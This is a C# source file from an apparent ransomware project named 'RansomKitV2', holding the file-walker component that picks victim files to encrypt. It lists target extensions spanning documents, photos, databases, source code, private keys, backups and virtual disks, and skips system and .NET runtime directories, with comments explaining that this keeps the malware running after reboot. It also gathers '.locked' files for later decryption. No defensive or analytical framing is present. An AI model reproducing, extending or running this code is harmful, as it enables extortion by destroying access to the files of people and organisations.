using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace RansomKitV2
{
    static class Walker
    {
        // Extensions to encrypt
        static readonly HashSet<string> Targets = new(StringComparer.OrdinalIgnoreCase)
        {
            // Office / documents
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp",
            ".pages", ".numbers", ".key",

            // Images / media
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
            ".raw", ".cr2", ".nef", ".dng", ".heic",
            ".mp3", ".mp4", ".avi", ".mov", ".mkv", ".flv",
            ".wmv", ".wav", ".flac", ".aac", ".m4a",

            // Archives
            ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",

            // Databases
            ".sql", ".db", ".mdb", ".accdb", ".sqlite", ".dbf",

            // Design / dev source files only (NOT runtime config)
            ".psd", ".ai", ".indd", ".svg", ".xcf", ".fig",
            ".py", ".js", ".ts", ".php", ".html", ".css",
            ".java", ".cs", ".cpp", ".c", ".h", ".go",
            ".rs", ".rb",

            // Keys / certs
            ".pem", ".p12", ".pfx", ".cer", ".crt", ".pub",

            // VM / backup
            ".bak", ".backup", ".iso", ".vmdk", ".vhd", ".vhdx",

            // eBooks
            ".epub", ".mobi",

            // NOTE: .json .xml .csv .yml .yaml .env .toml REMOVED from targets.
            // These extensions cover .NET runtime config files (runtimeconfig.json,
            // deps.json, appsettings.json) that the process needs to survive reboot.
            // Encrypting them kills the launcher on next startup.
        };

        // Directory NAMES to skip (case-insensitive, matches any depth)
        static readonly HashSet<string> SkipDirNames = new(StringComparer.OrdinalIgnoreCase)
        {
            "Windows", "System32", "SysWOW64", "WinSxS",
            "Program Files", "Program Files (x86)", "ProgramData",
            "$Recycle.Bin", "System Volume Information",
            "Boot", "Recovery", "PerfLogs", "MicrosoftUpdate",
            // .NET runtime lives here — skip by name too
            "dotnet", "shared", "host", "packs",
            // Visual Studio / build tools
            "MSBuild", "dotnet-sdk", "NuGet",
        };

        // Full-path prefixes to always skip (resolved once at startup)
        static readonly HashSet<string> SkipFullPaths = BuildSkipFullPaths();

        static HashSet<string> BuildSkipFullPaths()
        {
            var set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            // 1. The running executable's own directory — CRITICAL.
            //    Without this, the app encrypts its own runtimeconfig.json / deps.json
            //    and can't restart after reboot.
            try
            {
                string? exeDir = Path.GetDirectoryName(
                    Process.GetCurrentProcess().MainModule?.FileName
                    ?? Environment.ProcessPath);
                if (!string.IsNullOrEmpty(exeDir))
                    set.Add(Path.GetFullPath(exeDir));
            }
            catch { }

            // 2. .NET SDK / runtime install root (Program Files\dotnet)
            foreach (var pf in new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            })
            {
                if (!string.IsNullOrEmpty(pf))
                {
                    set.Add(Path.Combine(pf, "dotnet"));
                    set.Add(Path.Combine(pf, "Microsoft.NET"));
                    set.Add(Path.Combine(pf, "Windows Kits"));
                }
            }

            // 3. User-local .NET packages / NuGet cache
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            if (!string.IsNullOrEmpty(userProfile))
            {
                set.Add(Path.Combine(userProfile, ".dotnet"));
                set.Add(Path.Combine(userProfile, ".nuget"));
                set.Add(Path.Combine(userProfile, "AppData", "Local", "Microsoft", "dotnet"));
            }

            // 4. ProgramData .NET / Windows Update artefacts
            string? pd = Environment.GetEnvironmentVariable("ProgramData");
            if (!string.IsNullOrEmpty(pd))
            {
                set.Add(Path.Combine(pd, "Microsoft", ".NET"));
                set.Add(Path.Combine(pd, "Package Cache"));
            }

            return set;
        }

        /// <summary>Returns true if <paramref name="fullDirPath"/> must not be walked.</summary>
        static bool ShouldSkipDir(string fullDirPath)
        {
            // Name-based check (fast)
            string name = Path.GetFileName(fullDirPath);
            if (SkipDirNames.Contains(name)) return true;

            // Full-path prefix check
            string normalised = Path.GetFullPath(fullDirPath);
            foreach (var protected_ in SkipFullPaths)
            {
                // Skip if the dir IS the protected path, or is inside it
                if (normalised.Equals(protected_, StringComparison.OrdinalIgnoreCase))
                    return true;
                if (normalised.StartsWith(protected_ + Path.DirectorySeparatorChar,
                        StringComparison.OrdinalIgnoreCase))
                    return true;
            }

            return false;
        }

        /// <summary>
        /// Recursively yield all encryptable files under <paramref name="root"/>.
        /// Skips system dirs, .NET runtime dirs, and the process's own directory.
        /// </summary>
        public static List<string> EnumerateTargets(string root)
        {
            var result = new List<string>();
            var queue = new Queue<string>();

            try { queue.Enqueue(Path.GetFullPath(root)); }
            catch { return result; }

            while (queue.Count > 0)
            {
                string dir = queue.Dequeue();

                if (ShouldSkipDir(dir)) continue;

                // Files in this dir
                string[] files;
                try { files = Directory.GetFiles(dir); }
                catch { files = Array.Empty<string>(); }

                foreach (var f in files)
                {
                    string ext = Path.GetExtension(f);
                    if (Targets.Contains(ext) &&
                        !f.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
                        result.Add(f);
                }

                // Recurse into subdirectories
                string[] subs;
                try { subs = Directory.GetDirectories(dir); }
                catch { subs = Array.Empty<string>(); }

                foreach (var s in subs) queue.Enqueue(s);
            }

            return result;
        }

        /// <summary>Collect all .locked files under a root (for decryption).</summary>
        public static List<string> EnumerateLocked(string root)
        {
            var result = new List<string>();
            var queue = new Queue<string>();

            try { queue.Enqueue(Path.GetFullPath(root)); }
            catch { return result; }

            while (queue.Count > 0)
            {
                string dir = queue.Dequeue();

                string[] files;
                try { files = Directory.GetFiles(dir, "*" + CryptoEngine.LOCKED_EXT); }
                catch { files = Array.Empty<string>(); }

                foreach (var f in files) result.Add(f);

                string[] subs;
                try { subs = Directory.GetDirectories(dir); }
                catch { subs = Array.Empty<string>(); }

                foreach (var s in subs) queue.Enqueue(s);
            }

            return result;
        }
    }
}